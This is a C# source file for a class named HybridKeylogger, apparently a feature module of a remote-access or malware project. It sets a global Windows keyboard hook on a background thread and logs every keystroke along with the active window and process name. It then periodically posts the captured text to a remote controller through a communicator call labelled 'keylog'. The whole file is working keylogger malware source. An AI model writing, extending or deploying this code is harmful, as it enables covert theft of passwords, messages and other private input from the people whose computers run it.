using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using True.Core;

namespace True.Features
{
    public static class HybridKeylogger
    {
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static StringBuilder _buffer = new StringBuilder();
        private static StringBuilder _lineBuffer = new StringBuilder();
        private static string _lastWindow = "";
        private static string _lastKey = "";
        private static DateTime _lastKeyTime = DateTime.MinValue;
        private static DateTime _lastFlush = DateTime.Now;
        private static DateTime _lastKeyPress = DateTime.Now;

        private static readonly int _flushInterval = 10000;
        private static readonly int _maxBufferSize = 2048;
        private static readonly TimeSpan _idleThreshold = TimeSpan.FromSeconds(6);
        private static System.Threading.Timer _flushTimer;
        private static Thread _hookThread;
        private static bool _isRunning = false;


        private static readonly HashSet<Keys> IgnoredKeys = new HashSet<Keys>
        {
            Keys.LShiftKey, Keys.RShiftKey, Keys.ShiftKey,
            Keys.ControlKey, Keys.LControlKey, Keys.RControlKey,
            Keys.Menu, Keys.LMenu, Keys.RMenu,
            Keys.Capital, Keys.NumLock, Keys.Scroll
        };

        public static void Start()
        {
            if (_isRunning) return;
            _isRunning = true;

            _hookThread = new Thread(() =>
            {
                _hookID = SetHook(_proc);
                _flushTimer = new System.Threading.Timer(FlushCallback, null, _flushInterval, _flushInterval);

                Application.Run(); // Keep the thread alive
                UnhookWindowsHookEx(_hookID); // Clean after exit
                _hookID = IntPtr.Zero;
                Logger.Info("Keylogger", "Hook unregistered.");
            });

            _hookThread.SetApartmentState(ApartmentState.STA);
            _hookThread.IsBackground = true;
            _hookThread.Start();

            Logger.Info("Keylogger", "Hybrid keylogger started.");
        }


        public static void Stop()
        {
            if (!_isRunning) return;
            _isRunning = false;

            try
            {
                Logger.Info("Keylogger", "Stopping hybrid keylogger...");
                _flushTimer?.Dispose();

                // Signal the message loop to stop
                Application.ExitThread();

                // Optionally wait for the thread to shut down (clean exit)
                if (_hookThread != null && _hookThread.IsAlive)
                {
                    _hookThread.Join(1000); // Wait max 1 second
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Keylogger", $"Failed to stop properly: {ex.Message}");
            }

            Flush();
        }


        private static void FlushCallback(object state)
        {
            MaybeFlushOnIdle();
        }

        private static void MaybeFlushOnIdle()
        {
            if ((DateTime.Now - _lastKeyPress) > _idleThreshold && _lineBuffer.Length > 0)
            {
                _buffer.AppendLine(_lineBuffer.ToString());
                _lineBuffer.Clear();
                Flush();
            }
        }

        private static void Flush()
        {
            try
            {
                if (_buffer.Length == 0) return;

                string data = _buffer.ToString();
                _buffer.Clear();
                _lastFlush = DateTime.Now;

                Logger.Info("Keylogger", $"Flushing {data.Length} chars");
                _ = Communicator.PostResponse("keylog", data);
            }
            catch (Exception ex)
            {
                Logger.Error("Keylogger", $"Flush failed: {ex.Message}");
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                _lastKeyPress = DateTime.Now;

                if (IgnoredKeys.Contains(key)) return CallNextHookEx(_hookID, nCode, wParam, lParam);

                string currentWindow = GetActiveWindowTitle();
                if (_lastWindow != currentWindow)
                {
                    _lastWindow = currentWindow;
                    _buffer.AppendLine();
                    _buffer.AppendLine($"--- {DateTime.Now:G} ---");
                    _buffer.AppendLine($"[{currentWindow}]");
                }

                string processedKey = ProcessKey(key);
                if (!string.IsNullOrEmpty(processedKey))
                {
                    AppendToLine(processedKey);
                }

                if (_buffer.Length >= _maxBufferSize)
                    Flush();
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string ProcessKey(Keys key)
        {
            string formatted = GetFormattedKey(key);

            // Debounce repeated characters
            if (formatted == _lastKey && (DateTime.Now - _lastKeyTime).TotalMilliseconds < 100)
                return null;

            _lastKey = formatted;
            _lastKeyTime = DateTime.Now;
            return formatted;
        }

        private static string GetFormattedKey(Keys key)
        {
            bool shift = Control.ModifierKeys.HasFlag(Keys.Shift);

            if (key == Keys.Space) return " ";
            if (key == Keys.Enter) return "[ENTER]\n";
            if (key == Keys.Tab) return "[TAB]";
            if (key == Keys.Back) return "[BACK]";
            if (key == Keys.Escape) return "[ESC]";
            if (key == Keys.Delete) return "[DEL]";
            if (key == Keys.Left) return "[LEFT]";
            if (key == Keys.Right) return "[RIGHT]";
            if (key == Keys.Up) return "[UP]";
            if (key == Keys.Down) return "[DOWN]";

            Dictionary<Keys, string> shiftedSymbols = new()
            {
                { Keys.D1, "!" }, { Keys.D2, "@" }, { Keys.D3, "#" }, { Keys.D4, "$" },
                { Keys.D5, "%" }, { Keys.D6, "^" }, { Keys.D7, "&" }, { Keys.D8, "*" },
                { Keys.D9, "(" }, { Keys.D0, ")" }, { Keys.OemMinus, "_" },
                { (Keys)0xBB, "+" }, // OemPlus, { Keys.OemOpenBrackets, "{" }, { Keys.Oem6, "}" },
                { Keys.Oem5, "|" }, { Keys.Oem1, ":" }, { Keys.Oem7, "\"" },
                { Keys.Oemcomma, "<" }, { Keys.OemPeriod, ">" }, { Keys.Oem2, "?" }
            };

            Dictionary<Keys, string> unshiftedSymbols = new()
            {
                { Keys.OemMinus, "-" }, { (Keys)0xBB, "=" }, { Keys.OemOpenBrackets, "[" },
                { Keys.Oem6, "]" }, { Keys.Oem5, "\\" }, { Keys.Oem1, ";" },
                { Keys.Oem7, "'" }, { Keys.Oemcomma, "," }, { Keys.OemPeriod, "." },
                { Keys.Oem2, "/" }
            };

            if (shift && shiftedSymbols.TryGetValue(key, out var shiftedVal)) return shiftedVal;
            if (!shift && unshiftedSymbols.TryGetValue(key, out var unshiftedVal)) return unshiftedVal;

            string strKey = key.ToString();
            if (strKey.Length == 1)
                return shift ? strKey : strKey.ToLower();

            if (strKey.StartsWith("D") && strKey.Length == 2 && char.IsDigit(strKey[1]))
                return shift ? shiftedSymbols.GetValueOrDefault(key, strKey[1].ToString()) : strKey[1].ToString();

            return $"[{strKey}]";
        }

        private static void AppendToLine(string key)
        {
            if (key == "[ENTER]\n")
            {
                _buffer.AppendLine(_lineBuffer.ToString());
                _lineBuffer.Clear();
            }
            else if (key == "[BACK]")
            {
                if (_lineBuffer.Length > 0)
                    _lineBuffer.Length -= 1;
            }
            else
            {
                _lineBuffer.Append(key);
            }
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                try
                {
                    GetWindowThreadProcessId(handle, out uint pid);
                    var proc = Process.GetProcessById((int)pid);
                    return $"{proc.ProcessName} - {Buff}";
                }
                catch
                {
                    return Buff.ToString();
                }
            }

            return "Unknown";
        }

        // WinAPI
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
